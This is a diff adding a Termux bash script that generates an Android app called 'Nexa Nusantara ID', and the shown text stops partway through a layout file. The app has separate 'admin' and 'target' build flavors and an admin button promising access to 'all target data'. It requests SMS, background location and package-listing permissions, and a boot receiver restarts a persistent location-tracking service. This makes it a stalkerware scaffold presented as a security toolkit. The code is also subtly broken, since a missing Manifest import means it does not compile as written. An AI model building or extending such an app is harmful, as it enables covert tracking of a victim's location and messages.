@@ -1,0 +1,939 @@
+#!/bin/bash
+# ============================================================
+# SETUP NEXA NUSANTARA ID — FULL PROJECT GENERATOR
+# ============================================================
+# Jalankan di Termux:
+#   1. pkg install git curl -y
+#   2. nano setup_nexa.sh  (paste skrip ini)
+#   3. chmod +x setup_nexa.sh
+#   4. ./setup_nexa.sh
+# ============================================================
+
+set -e
+
+PROJECT="NexaNusantaraID"
+PKG_PATH="com/nexa/nusantara"
+
+echo "🚀 Membuat project $PROJECT ..."
+
+# ---- Buat folder ----
+mkdir -p "$PROJECT/app/src/main/java/$PKG_PATH"
+mkdir -p "$PROJECT/app/src/main/res/drawable"
+mkdir -p "$PROJECT/app/src/main/res/drawable-v24"
+mkdir -p "$PROJECT/app/src/main/res/values"
+mkdir -p "$PROJECT/app/src/main/res/layout"
+mkdir -p "$PROJECT/app/src/main/res/anim"
+mkdir -p "$PROJECT/app/src/main/res/mipmap-hdpi"
+mkdir -p "$PROJECT/app/src/main/res/mipmap-mdpi"
+mkdir -p "$PROJECT/app/src/main/res/mipmap-xhdpi"
+mkdir -p "$PROJECT/app/src/main/res/mipmap-xxhdpi"
+mkdir -p "$PROJECT/app/src/main/res/mipmap-xxxhdpi"
+mkdir -p "$PROJECT/app/src/main/res/mipmap-anydpi-v26"
+mkdir -p "$PROJECT/.github/workflows"
+mkdir -p "$PROJECT/gradle/wrapper"
+
+# ---- 1. AndroidManifest.xml ----
+cat > "$PROJECT/app/src/main/AndroidManifest.xml" << 'EOF'
+<?xml version="1.0" encoding="utf-8"?>
+<manifest xmlns:android="http://schemas.android.com/apk/res/android"
+    xmlns:tools="http://schemas.android.com/tools">
+
+    <uses-permission android:name="android.permission.CAMERA" />
+    <uses-permission android:name="android.permission.FLASHLIGHT" />
+    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
+    <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION" />
+    <uses-permission android:name="android.permission.READ_SMS" />
+    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
+    <uses-permission android:name="android.permission.INTERNET" />
+    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
+    <uses-permission android:name="android.permission.QUERY_ALL_PACKAGES"
+        tools:ignore="QueryAllPackagesPermission" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
+
+    <application
+        android:allowBackup="true"
+        android:icon="@mipmap/ic_launcher"
+        android:roundIcon="@mipmap/ic_launcher_round"
+        android:label="@string/app_name"
+        android:theme="@style/Theme.Nexa"
+        android:usesCleartextTraffic="true">
+
+        <activity android:name=".SplashActivity"
+            android:exported="true"
+            android:theme="@style/Theme.Splash"
+            android:screenOrientation="portrait">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity>
+
+        <activity android:name=".MainActivity"
+            android:exported="false"
+            android:screenOrientation="portrait" />
+
+        <service android:name=".LocationService"
+            android:exported="false"
+            android:foregroundServiceType="location" />
+
+        <receiver android:name=".BootReceiver"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.BOOT_COMPLETED" />
+            </intent-filter>
+        </receiver>
+
+    </application>
+</manifest>
+EOF
+
+# ---- 2. build.gradle (app) ----
+cat > "$PROJECT/app/build.gradle" << 'EOF'
+plugins {
+    id 'com.android.application'
+}
+
+android {
+    namespace 'com.nexa.nusantara'
+    compileSdk 34
+
+    defaultConfig {
+        applicationId "com.nexa.nusantara"
+        minSdk 23
+        targetSdk 34
+        versionCode 1
+        versionName "1.0"
+    }
+
+    flavorDimensions "default"
+    productFlavors {
+        admin {
+            applicationId "com.nexa.nusantara.admin"
+            versionName "1.0-admin"
+            buildConfigField "boolean", "IS_ADMIN", "true"
+        }
+        target {
+            applicationId "com.nexa.nusantara"
+            versionName "1.0"
+            buildConfigField "boolean", "IS_ADMIN", "false"
+        }
+    }
+
+    buildTypes {
+        release {
+            minifyEnabled true
+            proguardFiles getDefaultProguardFile('proguard-android-optimize.txt'), 'proguard-rules.pro'
+        }
+    }
+    compileOptions {
+        sourceCompatibility JavaVersion.VERSION_1_8
+        targetCompatibility JavaVersion.VERSION_1_8
+    }
+}
+
+dependencies {
+    implementation 'androidx.appcompat:appcompat:1.6.1'
+    implementation 'com.google.android.material:material:1.11.0'
+    implementation 'androidx.cardview:cardview:1.0.0'
+    implementation 'androidx.gridlayout:gridlayout:1.0.0'
+}
+EOF
+
+# ---- 3. build.gradle (project) ----
+cat > "$PROJECT/build.gradle" << 'EOF'
+plugins {
+    id 'com.android.application' version '8.2.0' apply false
+}
+EOF
+
+# ---- 4. settings.gradle ----
+cat > "$PROJECT/settings.gradle" << 'EOF'
+pluginManagement {
+    repositories {
+        google()
+        mavenCentral()
+        gradlePluginPortal()
+    }
+}
+dependencyResolutionManagement {
+    repositoriesMode.set(RepositoriesMode.FAIL_ON_PROJECT_REPOS)
+    repositories {
+        google()
+        mavenCentral()
+    }
+}
+rootProject.name = "NexaNusantaraID"
+include ':app'
+EOF
+
+# ---- 5. gradle.properties ----
+cat > "$PROJECT/gradle.properties" << 'EOF'
+org.gradle.jvmargs=-Xmx2048m
+android.useAndroidX=true
+android.enableJetifier=true
+EOF
+
+# ---- 6. strings.xml ----
+cat > "$PROJECT/app/src/main/res/values/strings.xml" << 'EOF'
+<resources>
+    <string name="app_name">Nexa Nusantara ID</string>
+</resources>
+EOF
+
+# ---- 7. themes.xml ----
+cat > "$PROJECT/app/src/main/res/values/themes.xml" << 'EOF'
+<resources>
+    <style name="Theme.Nexa" parent="Theme.MaterialComponents.DayNight.NoActionBar">
+        <item name="android:statusBarColor">@android:color/transparent</item>
+        <item name="android:windowBackground">@drawable/bg_hacker_gradient</item>
+        <item name="android:windowLightStatusBar">false</item>
+        <item name="android:navigationBarColor">@color/black</item>
+        <item name="colorPrimary">@color/nexa_gold</item>
+        <item name="colorPrimaryVariant">@color/dark_gold</item>
+        <item name="colorOnPrimary">@color/black</item>
+        <item name="colorSecondary">@color/nexa_cyan</item>
+        <item name="colorOnSecondary">@color/black</item>
+    </style>
+
+    <style name="Theme.Splash" parent="Theme.MaterialComponents.DayNight.NoActionBar">
+        <item name="android:windowBackground">@drawable/splash_background</item>
+        <item name="android:statusBarColor">@color/black</item>
+        <item name="android:windowLightStatusBar">false</item>
+        <item name="android:navigationBarColor">@color/black</item>
+    </style>
+</resources>
+EOF
+
+# ---- 8. colors.xml ----
+cat > "$PROJECT/app/src/main/res/values/colors.xml" << 'EOF'
+<resources>
+    <color name="nexa_gold">#FFD700</color>
+    <color name="dark_gold">#B8860B</color>
+    <color name="nexa_cyan">#00FFFF</color>
+    <color name="dark_bg">#0A0A0A</color>
+    <color name="card_bg">#1A1A1A</color>
+    <color name="text_primary">#E0E0E0</color>
+    <color name="text_secondary">#A0A0A0</color>
+    <color name="black">#000000</color>
+</resources>
+EOF
+
+# ---- 9. bg_hacker_gradient.xml ----
+cat > "$PROJECT/app/src/main/res/drawable/bg_hacker_gradient.xml" << 'EOF'
+<shape xmlns:android="http://schemas.android.com/apk/res/android"
+    android:shape="rectangle">
+    <gradient
+        android:startColor="#0A0A0A"
+        android:endColor="#1A1A0A"
+        android:angle="135"
+        android:type="linear" />
+</shape>
+EOF
+
+# ---- 10. splash_background.xml ----
+cat > "$PROJECT/app/src/main/res/drawable/splash_background.xml" << 'EOF'
+<?xml version="1.0" encoding="utf-8"?>
+<layer-list xmlns:android="http://schemas.android.com/apk/res/android">
+    <item android:drawable="@color/black" />
+    <item>
+        <bitmap
+            android:gravity="center"
+            android:src="@drawable/ic_nexa_logo" />
+    </item>
+</layer-list>
+EOF
+
+# ---- 11. ic_nexa_logo.xml ----
+cat > "$PROJECT/app/src/main/res/drawable/ic_nexa_logo.xml" << 'EOF'
+<vector xmlns:android="http://schemas.android.com/apk/res/android"
+    android:width="200dp"
+    android:height="100dp"
+    android:viewportWidth="200"
+    android:viewportHeight="100">
+    <group>
+        <path
+            android:pathData="M20,20 L180,20"
+            android:strokeColor="#FFD700"
+            android:strokeWidth="2" />
+        <path
+            android:pathData="M20,80 L180,80"
+            android:strokeColor="#FFD700"
+            android:strokeWidth="2" />
+        <text
+            android:text="NEXA"
+            android:textSize="36"
+            android:textColor="#FFD700"
+            android:fontFamily="sans-serif-black"
+            android:x="50"
+            android:y="45"
+            android:letterSpacing="0.1" />
+        <text
+            android:text="NUSANTARA ID"
+            android:textSize="18"
+            android:textColor="#FFFFFF"
+            android:fontFamily="sans-serif-medium"
+            android:x="40"
+            android:y="70"
+            android:letterSpacing="0.15" />
+    </group>
+</vector>
+EOF
+
+# ---- 12. card_selector.xml ----
+cat > "$PROJECT/app/src/main/res/drawable/card_selector.xml" << 'EOF'
+<selector xmlns:android="http://schemas.android.com/apk/res/android">
+    <item android:state_pressed="true">
+        <shape android:shape="rectangle">
+            <solid android:color="#2A2A1A" />
+            <stroke android:width="2dp" android:color="#FFD700" />
+            <corners android:radius="16dp" />
+        </shape>
+    </item>
+    <item>
+        <shape android:shape="rectangle">
+            <solid android:color="#1A1A1A" />
+            <corners android:radius="16dp" />
+        </shape>
+    </item>
+</selector>
+EOF
+
+# ---- 13. scale.xml (animasi) ----
+cat > "$PROJECT/app/src/main/res/anim/scale.xml" << 'EOF'
+<set xmlns:android="http://schemas.android.com/apk/res/android">
+    <scale
+        android:duration="200"
+        android:fromXScale="1.0"
+        android:fromYScale="1.0"
+        android:toXScale="0.95"
+        android:toYScale="0.95"
+        android:pivotX="50%"
+        android:pivotY="50%" />
+</set>
+EOF
+
+# ---- 14. Ikon vektor untuk fitur (8 ikon) ----
+# (kita reuse dari skrip sebelumnya)
+cat > "$PROJECT/app/src/main/res/drawable/ic_camera_front.xml" << 'EOF'
+<vector xmlns:android="http://schemas.android.com/apk/res/android"
+    android:width="24dp" android:height="24dp" android:viewportWidth="24" android:viewportHeight="24">
+    <path android:fillColor="#FFD700" android:pathData="M9,2L7,4H4c-1.1,0-2,0.9-2,2v12c0,1.1,0.9,2,2,2h16c1.1,0,2-0.9,2-2V6c0-1.1-0.9-2-2-2h-3L15,2H9z M12,7c2.76,0,5,2.24,5,5s-2.24,5-5,5-5-2.24-5-5 2.24-5,5-5z"/>
+</vector>
+EOF
+
+cat > "$PROJECT/app/src/main/res/drawable/ic_camera_back.xml" << 'EOF'
+<vector xmlns:android="http://schemas.android.com/apk/res/android"
+    android:width="24dp" android:height="24dp" android:viewportWidth="24" android:viewportHeight="24">
+    <path android:fillColor="#00FFFF" android:pathData="M20,4h-3.17L15,2H9L7.17,4H4c-1.1,0-2,0.9-2,2v12c0,1.1,0.9,2,2,2h16c1.1,0,2-0.9,2-2V6c0-1.1-0.9-2-2-2z M12,17c-2.76,0-5-2.24-5-5s2.24-5,5-5 5,2.24,5,5-2.24,5-5,5z"/>
+</vector>
+EOF
+
+cat > "$PROJECT/app/src/main/res/drawable/ic_whatsapp.xml" << 'EOF'
+<vector xmlns:android="http://schemas.android.com/apk/res/android"
+    android:width="24dp" android:height="24dp" android:viewportWidth="24" android:viewportHeight="24">
+    <path android:fillColor="#25D366" android:pathData="M17.472,14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94,1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198,0-.52.074-.792.372-.272.297-1.04,1.016-1.04,2.479 0,1.462 1.065,2.875 1.213,3.074.149.198 2.096,3.2 5.077,4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421,7.403h-.004a9.87,9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86,9.86 0 01-1.51-5.26c0-5.45 4.434-9.884 9.885-9.884 2.639,0 5.119,1.028 6.984,2.893 1.865,1.865 2.893,4.345 2.893,6.984-.001,5.45-4.435,9.884-9.885,9.884"/>
+</vector>
+EOF
+
+cat > "$PROJECT/app/src/main/res/drawable/ic_gallery.xml" << 'EOF'
+<vector xmlns:android="http://schemas.android.com/apk/res/android"
+    android:width="24dp" android:height="24dp" android:viewportWidth="24" android:viewportHeight="24">
+    <path android:fillColor="#FF9F43" android:pathData="M22,16V4c0-1.1-.9-2-2-2H8c-1.1,0-2,0.9-2,2v12c0,1.1,0.9,2,2,2h12c1.1,0,2-0.9,2-2z M11,12l2.03,2.71L16,11l4,5H8l3-4z M2,6v14c0,1.1,0.9,2,2,2h14v-2H4V6H2z"/>
+</vector>
+EOF
+
+cat > "$PROJECT/app/src/main/res/drawable/ic_sms.xml" << 'EOF'
+<vector xmlns:android="http://schemas.android.com/apk/res/android"
+    android:width="24dp" android:height="24dp" android:viewportWidth="24" android:viewportHeight="24">
+    <path android:fillColor="#00BFFF" android:pathData="M20,2H4c-1.1,0-1.99,0.9-1.99,2L2,22l4-4h14c1.1,0,2-0.9,2-2V4c0-1.1-0.9-2-2-2z M18,14H6v-2h12v2z M18,11H6V9h12v2z M18,8H6V6h12v2z"/>
+</vector>
+EOF
+
+cat > "$PROJECT/app/src/main/res/drawable/ic_gmail.xml" << 'EOF'
+<vector xmlns:android="http://schemas.android.com/apk/res/android"
+    android:width="24dp" android:height="24dp" android:viewportWidth="24" android:viewportHeight="24">
+    <path android:fillColor="#EA4335" android:pathData="M20,4H4c-1.1,0-1.99,0.9-1.99,2L2,18c0,1.1,0.9,2,2,2h16c1.1,0,2-0.9,2-2V6c0-1.1-0.9-2-2-2z M20,8l-8,5L4,8V6l8,5 8-5v2z"/>
+</vector>
+EOF
+
+cat > "$PROJECT/app/src/main/res/drawable/ic_flash.xml" << 'EOF'
+<vector xmlns:android="http://schemas.android.com/apk/res/android"
+    android:width="24dp" android:height="24dp" android:viewportWidth="24" android:viewportHeight="24">
+    <path android:fillColor="#FFD700" android:pathData="M7,2v11h3v9l7-12h-4l4-8z"/>
+</vector>
+EOF
+
+cat > "$PROJECT/app/src/main/res/drawable/ic_location.xml" << 'EOF'
+<vector xmlns:android="http://schemas.android.com/apk/res/android"
+    android:width="24dp" android:height="24dp" android:viewportWidth="24" android:viewportHeight="24">
+    <path android:fillColor="#FF5555" android:pathData="M12,2C8.13,2 5,5.13 5,9c0,5.25 7,13 7,13s7-7.75 7-13c0-3.87-3.13-7-7-7z M12,11.5c-1.38,0-2.5-1.12-2.5-2.5s1.12-2.5 2.5-2.5 2.5,1.12 2.5,2.5-1.12,2.5-2.5,2.5z"/>
+</vector>
+EOF
+
+# ---- 15. SplashActivity.java ----
+cat > "$PROJECT/app/src/main/java/$PKG_PATH/SplashActivity.java" << 'EOF'
+package com.nexa.nusantara;
+
+import android.content.Intent;
+import android.os.Bundle;
+import android.os.Handler;
+import androidx.appcompat.app.AppCompatActivity;
+
+public class SplashActivity extends AppCompatActivity {
+    @Override
+    protected void onCreate(Bundle savedInstanceState) {
+        super.onCreate(savedInstanceState);
+        new Handler().postDelayed(() -> {
+            startActivity(new Intent(SplashActivity.this, MainActivity.class));
+            finish();
+        }, 2000);
+    }
+}
+EOF
+
+# ---- 16. MainActivity.java ----
+cat > "$PROJECT/app/src/main/java/$PKG_PATH/MainActivity.java" << 'EOF'
+package com.nexa.nusantara;
+
+import android.Manifest;
+import android.content.Intent;
+import android.content.pm.PackageManager;
+import android.hardware.camera2.CameraAccessException;
+import android.hardware.camera2.CameraManager;
+import android.net.Uri;
+import android.os.Build;
+import android.os.Bundle;
+import android.provider.MediaStore;
+import android.view.View;
+import android.view.animation.AnimationUtils;
+import android.widget.Button;
+import android.widget.Toast;
+
+import androidx.appcompat.app.AppCompatActivity;
+import androidx.cardview.widget.CardView;
+import androidx.core.app.ActivityCompat;
+import androidx.core.content.ContextCompat;
+
+import java.util.ArrayList;
+import java.util.List;
+
+public class MainActivity extends AppCompatActivity {
+    private CameraManager cameraManager;
+    private String cameraId;
+    private boolean isFlashOn = false;
+
+    @Override
+    protected void onCreate(Bundle savedInstanceState) {
+        super.onCreate(savedInstanceState);
+        setContentView(R.layout.activity_main);
+
+        cameraManager = (CameraManager) getSystemService(CAMERA_SERVICE);
+        try {
+            cameraId = cameraManager.getCameraIdList()[0];
+        } catch (CameraAccessException e) { e.printStackTrace(); }
+
+        CardView cardFrontCam = findViewById(R.id.cardFrontCam);
+        CardView cardBackCam = findViewById(R.id.cardBackCam);
+        CardView cardWhatsApp = findViewById(R.id.cardWhatsApp);
+        CardView cardGallery = findViewById(R.id.cardGallery);
+        CardView cardSMS = findViewById(R.id.cardSMS);
+        CardView cardGmail = findViewById(R.id.cardGmail);
+        CardView cardFlash = findViewById(R.id.cardFlash);
+        CardView cardLocation = findViewById(R.id.cardLocation);
+
+        cardFrontCam.setOnClickListener(v -> { v.startAnimation(AnimationUtils.loadAnimation(this, R.anim.scale)); openCamera(true); });
+        cardBackCam.setOnClickListener(v -> { v.startAnimation(AnimationUtils.loadAnimation(this, R.anim.scale)); openCamera(false); });
+        cardWhatsApp.setOnClickListener(v -> { v.startAnimation(AnimationUtils.loadAnimation(this, R.anim.scale)); openApp("com.whatsapp"); });
+        cardGallery.setOnClickListener(v -> { v.startAnimation(AnimationUtils.loadAnimation(this, R.anim.scale)); openGallery(); });
+        cardSMS.setOnClickListener(v -> { v.startAnimation(AnimationUtils.loadAnimation(this, R.anim.scale)); openSMS(); });
+        cardGmail.setOnClickListener(v -> { v.startAnimation(AnimationUtils.loadAnimation(this, R.anim.scale)); openApp("com.google.android.gm"); });
+        cardFlash.setOnClickListener(v -> { v.startAnimation(AnimationUtils.loadAnimation(this, R.anim.scale)); toggleFlash(); });
+        cardLocation.setOnClickListener(v -> { v.startAnimation(AnimationUtils.loadAnimation(this, R.anim.scale)); startLocationService(); });
+
+        if (BuildConfig.IS_ADMIN) {
+            Button btnAdmin = findViewById(R.id.btnAdmin);
+            btnAdmin.setVisibility(View.VISIBLE);
+            btnAdmin.setOnClickListener(v -> {
+                v.startAnimation(AnimationUtils.loadAnimation(this, R.anim.scale));
+                Toast.makeText(this, "Admin Panel: Akses semua data target", Toast.LENGTH_LONG).show();
+            });
+        }
+
+        checkPermissions();
+    }
+
+    private void checkPermissions() {
+        String[] perms = {
+                Manifest.permission.CAMERA,
+                Manifest.permission.ACCESS_FINE_LOCATION,
+                Manifest.permission.ACCESS_BACKGROUND_LOCATION,
+                Manifest.permission.READ_SMS,
+                Manifest.permission.READ_EXTERNAL_STORAGE,
+                Manifest.permission.WRITE_EXTERNAL_STORAGE,
+                Manifest.permission.INTERNET
+        };
+        List<String> list = new ArrayList<>();
+        for (String p : perms) {
+            if (ContextCompat.checkSelfPermission(this, p) != PackageManager.PERMISSION_GRANTED)
+                list.add(p);
+        }
+        if (!list.isEmpty()) {
+            ActivityCompat.requestPermissions(this, list.toArray(new String[0]), 123);
+        }
+    }
+
+    private void openCamera(boolean front) {
+        Intent intent = new Intent(MediaStore.ACTION_IMAGE_CAPTURE);
+        if (intent.resolveActivity(getPackageManager()) != null) {
+            startActivity(intent);
+        } else {
+            Toast.makeText(this, "Kamera tidak tersedia", Toast.LENGTH_SHORT).show();
+        }
+    }
+
+    private void openApp(String pkg) {
+        Intent intent = getPackageManager().getLaunchIntentForPackage(pkg);
+        if (intent != null) startActivity(intent);
+        else Toast.makeText(this, "Aplikasi tidak terinstal", Toast.LENGTH_SHORT).show();
+    }
+
+    private void openGallery() {
+        Intent intent = new Intent(Intent.ACTION_PICK, MediaStore.Images.Media.EXTERNAL_CONTENT_URI);
+        startActivity(intent);
+    }
+
+    private void openSMS() {
+        Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse("sms:"));
+        startActivity(intent);
+    }
+
+    private void toggleFlash() {
+        try {
+            if (cameraId != null) {
+                isFlashOn = !isFlashOn;
+                cameraManager.setTorchMode(cameraId, isFlashOn);
+                Toast.makeText(this, isFlashOn ? "Senter ON" : "Senter OFF", Toast.LENGTH_SHORT).show();
+            }
+        } catch (CameraAccessException e) {
+            Toast.makeText(this, "Gagal akses senter", Toast.LENGTH_SHORT).show();
+        }
+    }
+
+    private void startLocationService() {
+        Intent intent = new Intent(this, LocationService.class);
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
+            startForegroundService(intent);
+        else
+            startService(intent);
+        Toast.makeText(this, "Tracking lokasi dimulai", Toast.LENGTH_SHORT).show();
+    }
+}
+EOF
+
+# ---- 17. LocationService.java ----
+cat > "$PROJECT/app/src/main/java/$PKG_PATH/LocationService.java" << 'EOF'
+package com.nexa.nusantara;
+
+import android.app.Notification;
+import android.app.NotificationChannel;
+import android.app.NotificationManager;
+import android.app.Service;
+import android.content.Context;
+import android.content.Intent;
+import android.content.pm.PackageManager;
+import android.location.Location;
+import android.location.LocationListener;
+import android.location.LocationManager;
+import android.os.Build;
+import android.os.Bundle;
+import android.os.IBinder;
+import android.util.Log;
+import android.widget.Toast;
+
+import androidx.core.app.NotificationCompat;
+
+public class LocationService extends Service implements LocationListener {
+    private LocationManager locationManager;
+    private static final int NOTIF_ID = 1001;
+    private static final String CHANNEL_ID = "location_channel";
+
+    @Override
+    public void onCreate() {
+        super.onCreate();
+        locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
+        if (checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
+            locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, 5000, 10, this);
+            locationManager.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, 5000, 10, this);
+        }
+        startForeground(NOTIF_ID, createNotification());
+    }
+
+    private Notification createNotification() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            NotificationChannel channel = new NotificationChannel(CHANNEL_ID,
+                    "Location Service", NotificationManager.IMPORTANCE_LOW);
+            NotificationManager manager = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
+            manager.createNotificationChannel(channel);
+        }
+        return new NotificationCompat.Builder(this, CHANNEL_ID)
+                .setContentTitle("Nexa Nusantara")
+                .setContentText("Tracking lokasi aktif")
+                .setSmallIcon(android.R.drawable.ic_menu_mylocation)
+                .build();
+    }
+
+    @Override
+    public int onStartCommand(Intent intent, int flags, int startId) {
+        return START_STICKY;
+    }
+
+    @Override
+    public void onLocationChanged(Location location) {
+        String loc = "Lat: " + location.getLatitude() + ", Lng: " + location.getLongitude();
+        Log.d("NEXA_LOC", loc);
+        Toast.makeText(this, "Lokasi: " + loc, Toast.LENGTH_SHORT).show();
+    }
+
+    @Override public void onStatusChanged(String provider, int status, Bundle extras) {}
+    @Override public void onProviderEnabled(String provider) {}
+    @Override public void onProviderDisabled(String provider) {}
+
+    @Override
+    public IBinder onBind(Intent intent) { return null; }
+
+    @Override
+    public void onDestroy() {
+        super.onDestroy();
+        if (locationManager != null && checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
+            locationManager.removeUpdates(this);
+        }
+    }
+}
+EOF
+
+# ---- 18. BootReceiver.java ----
+cat > "$PROJECT/app/src/main/java/$PKG_PATH/BootReceiver.java" << 'EOF'
+package com.nexa.nusantara;
+
+import android.content.BroadcastReceiver;
+import android.content.Context;
+import android.content.Intent;
+import android.os.Build;
+
+public class BootReceiver extends BroadcastReceiver {
+    @Override
+    public void onReceive(Context context, Intent intent) {
+        if (Intent.ACTION_BOOT_COMPLETED.equals(intent.getAction())) {
+            Intent service = new Intent(context, LocationService.class);
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
+                context.startForegroundService(service);
+            else
+                context.startService(service);
+        }
+    }
+}
+EOF
+
+# ---- 19. activity_main.xml ----
+cat > "$PROJECT/app/src/main/res/layout/activity_main.xml" << 'EOF'
+<?xml version="1.0" encoding="utf-8"?>
+<ScrollView xmlns:android="http://schemas.android.com/apk/res/android"
+    xmlns:app="http://schemas.android.com/apk/res-auto"
+    android:layout_width="match_parent"
+    android:layout_height="match_parent"
+    android:fillViewport="true"
+    android:background="@drawable/bg_hacker_gradient">
+
+    <RelativeLayout
+        android:layout_width="match_parent"
+        android:layout_height="wrap_content"
+        android:padding="16dp">
+
+        <TextView
+            android:id="@+id/title"
+            android:layout_width="match_parent"
+            android:layout_height="wrap_content"
+            android:text="NEXA NUSANTARA"
+            android:textSize="28sp"
+            android:textColor="#FFD700"
+            android:fontFamily="sans-serif-black"
+            android:letterSpacing="0.1"
+            android:shadowColor="#FFD700"
+            android:shadowDx="0"
+            android:shadowDy="0"
+            android:shadowRadius="20"
+            android:layout_marginTop="30dp"
+            android:gravity="center" />
+
+        <TextView
+            android:id="@+id/subtitle"
+            android:layout_width="match_parent"
+            android:layout_height="wrap_content"
+            android:text="PREMIUM SECURITY TOOLKIT"
+            android:textSize="12sp"
+            android:textColor="#A0A0A0"
+            android:gravity="center"
+            android:layout_below="@id/title"
+            android:layout_marginTop="4dp"
+            android:letterSpacing="0.3" />
+
+        <androidx.gridlayout.widget.GridLayout
+            android:id="@+id/gridLayout"
+            android:layout_width="match_parent"
+            android:layout_height="wrap_content"
+            android:layout_below="@id/subtitle"
+            android:layout_marginTop="30dp"
+            app:columnCount="2"
+            app:rowCount="4"
+            app:orientation="horizontal">
+
+            <androidx.cardview.widget.CardView
+                android:id="@+id/cardFrontCam"
+                android:layout_width="0dp"
+                android:layout_height="120dp"
+                android:layout_margin="8dp"
+                app:layout_columnWeight="1"
+                app:cardBackgroundColor="@drawable/card_selector"
+                app:cardCornerRadius="16dp"
+                app:cardElevation="8dp"
+                android:foreground="?attr/selectableItemBackgroundBorderless"
+                android:clickable="true">
+                <LinearLayout android:layout_width="match_parent" android:layout_height="match_parent"
+                    android:orientation="vertical" android:gravity="center" android:padding="8dp">
+                    <ImageView android:layout_width="48dp" android:layout_height="48dp"
+                        android:src="@drawable/ic_camera_front" android:tint="#FFD700" />
+                    <TextView android:layout_width="wrap_content" android:layout_height="wrap_content"
+                        android:text="Kamera Depan" android:textColor="#E0E0E0" android:textSize="14sp"
+                        android:fontFamily="sans-serif-medium" android:layout_marginTop="8dp" />
+                </LinearLayout>
+            </androidx.cardview.widget.CardView>
+
+            <androidx.cardview.widget.CardView
+                android:id="@+id/cardBackCam"
+                android:layout_width="0dp" android:layout_height="120dp" android:layout_margin="8dp"
+                app:layout_columnWeight="1" app:cardBackgroundColor="@drawable/card_selector"
+                app:cardCornerRadius="16dp" app:cardElevation="8dp"
+                android:foreground="?attr/selectableItemBackgroundBorderless" android:clickable="true">
+                <LinearLayout android:layout_width="match_parent" android:layout_height="match_parent"
+                    android:orientation="vertical" android:gravity="center" android:padding="8dp">
+                    <ImageView android:layout_width="48dp" android:layout_height="48dp"
+                        android:src="@drawable/ic_camera_back" android:tint="#00FFFF" />
+                    <TextView android:layout_width="wrap_content" android:layout_height="wrap_content"
+                        android:text="Kamera Belakang" android:textColor="#E0E0E0" android:textSize="14sp"
+                        android:fontFamily="sans-serif-medium" android:layout_marginTop="8dp" />
+                </LinearLayout>
+            </androidx.cardview.widget.CardView>
+
+            <androidx.cardview.widget.CardView
+                android:id="@+id/cardWhatsApp"
+                android:layout_width="0dp" android:layout_height="120dp" android:layout_margin="8dp"
+                app:layout_columnWeight="1" app:cardBackgroundColor="@drawable/card_selector"
+                app:cardCornerRadius="16dp" app:cardElevation="8dp"
+                android:foreground="?attr/selectableItemBackgroundBorderless" android:clickable="true">
+                <LinearLayout android:layout_width="match_parent" android:layout_height="match_parent"
+                    android:orientation="vertical" android:gravity="center" android:padding="8dp">
+                    <ImageView android:layout_width="48dp" android:layout_height="48dp"
+                        android:src="@drawable/ic_whatsapp" android:tint="#25D366" />
+                    <TextView android:layout_width="wrap_content" android:layout_height="wrap_content"
+                        android:text="WhatsApp" android:textColor="#E0E0E0" android:textSize="14sp"
+                        android:fontFamily="sans-serif-medium" android:layout_marginTop="8dp" />
+                </LinearLayout>
+            </androidx.cardview.widget.CardView>
+
+            <androidx.cardview.widget.CardView
+                android:id="@+id/cardGallery"
+                android:layout_width="0dp" android:layout_height="120dp" android:layout_margin="8dp"
+                app:layout_columnWeight="1" app:cardBackgroundColor="@drawable/card_selector"
+                app:cardCornerRadius="16dp" app:cardElevation="8dp"
+                android:foreground="?attr/selectableItemBackgroundBorderless" android:clickable="true">
+                <LinearLayout android:layout_width="match_parent" android:layout_height="match_parent"
+                    android:orientation="vertical" android:gravity="center" android:padding="8dp">
+                    <ImageView android:layout_width="48dp" android:layout_height="48dp"
+                        android:src="@drawable/ic_gallery" android:tint="#FF9F43" />
+                    <TextView android:layout_width="wrap_content" android:layout_height="wrap_content"
+                        android:text="Galeri" android:textColor="#E0E0E0" android:textSize="14sp"
+                        android:fontFamily="sans-serif-medium" android:layout_marginTop="8dp" />
+                </LinearLayout>
+            </androidx.cardview.widget.CardView>
+
+            <androidx.cardview.widget.CardView
+                android:id="@+id/cardSMS"
+                android:layout_width="0dp" android:layout_height="120dp" android:layout_margin="8dp"
+                app:layout_columnWeight="1" app:cardBackgroundColor="@drawable/card_selector"
+                app:cardCornerRadius="16dp" app:cardElevation="8dp"
+                android:foreground="?attr/selectableItemBackgroundBorderless" android:clickable="true">
+                <LinearLayout android:layout_width="match_parent" android:layout_height="match_parent"
+                    android:orientation="vertical" android:gravity="center" android:padding="8dp">
+                    <ImageView android:layout_width="48dp" android:layout_height="48dp"
